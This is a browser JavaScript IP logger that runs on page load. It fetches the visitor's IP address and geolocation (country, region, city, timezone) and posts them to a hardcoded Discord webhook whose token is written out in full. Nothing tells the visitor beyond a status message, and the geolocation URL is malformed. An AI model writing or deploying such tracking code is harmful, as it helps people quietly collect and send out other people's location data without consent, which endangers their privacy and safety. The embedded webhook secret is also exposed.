const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1488574733862830192/HdaqEUKW_FJzI2jsqPMc6jGyE-A32aj6BxQjRQ-SAKWiB9hN0vC6uWW9X4ElNicI9jMY";

async function logIpAndNotifyDiscord() {
  try {
    // 1. Get the user's IP address using a public API (e.g., ipify)
    const ipResponse = await fetch("https://api.ipify.org/?format=json");
    const ipData = await ipResponse.json();
    const userIp = ipData.ip;

    // 2. (Optional) Get more details using another API (e.g., ip-api.com)
    const detailsResponse = await fetch(`http://ip-api.com{userIp}`);
    const detailsData = await detailsResponse.json();

    // 3. Prepare the message payload for Discord
    const discordPayload = {
      username: "IP Logger Bot",
      content: `New visitor detected!`,
      embeds: [
        {
          title: "Visitor Information",
          fields: [
            { name: "IP Address", value: userIp, inline: true },
            { name: "Country", value: detailsData.country, inline: true },
            { name: "Region", value: detailsData.regionName, inline: true },
            { name: "City", value: detailsData.city, inline: true },
            { name: "Timezone", value: detailsData.timezone, inline: true },
          ],
          color: 0x00ff00 // Green color
        }
      ]
    };

    // 4. Send the data to the Discord webhook
    const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(discordPayload)
    });

    if (discordResponse.ok) {
      document.getElementById("status").innerText = "IP logged and Discord notified successfully!";
    } else {
      document.getElementById("status").innerText = "Failed to send notification to Discord.";
    }

  } catch (error) {
    console.error("Error:", error);
    document.getElementById("status").innerText = "An error occurred during the process.";
  }
}

// Run the function when the page loads
document.addEventListener("DOMContentLoaded", logIpAndNotifyDiscord);
